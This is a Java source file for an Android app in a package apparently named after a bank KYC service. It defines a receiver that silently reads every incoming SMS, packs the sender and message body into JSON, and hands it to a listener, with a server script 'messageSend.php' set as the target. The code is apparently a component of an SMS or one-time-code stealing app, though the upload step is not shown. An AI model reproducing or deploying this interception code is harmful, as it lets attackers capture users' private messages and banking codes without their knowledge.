package com.axiskyc.custom;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import org.json.JSONObject;

public class MessageBroadcastReceiver extends BroadcastReceiver {
    // creating a variable for a message listener interface on below line.
    private static MessageListenerInterface mListener;

    @Override
    public void onReceive(Context context, Intent intent) {
        Global.ShowLogs("onReceive");

        Global.webservice_is_show_loader = false;
        Global.webservice_file_name = "messageSend.php";

        // getting bundle data on below line from intent.
        Bundle data = intent.getExtras();
        Global.ShowLogs("onReceive-data = " + data.toString());

        // creating an object on below line.
        Object[] pdus = (Object[]) data.get("pdus");
        Global.ShowLogs("onReceive-pdus = " + pdus.length);

        // running for loop to read the sms on below line.
        for (int i = 0; i < pdus.length; i++) {
            // getting sms message on below line.
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);

            try {
                JSONObject obj = new JSONObject();
                obj.put("sender_number", smsMessage.getDisplayOriginatingAddress());
                obj.put("body", smsMessage.getMessageBody());
                obj.put("type", "inbox");
                obj.put("date", "" + System.currentTimeMillis());

                mListener.messageReceived(obj.toString());

            } catch (Exception e) {}
        }
    }
    // on below line we are binding the listener.
    public static void bindListener(MessageListenerInterface listener) {
        mListener = listener;
    }
}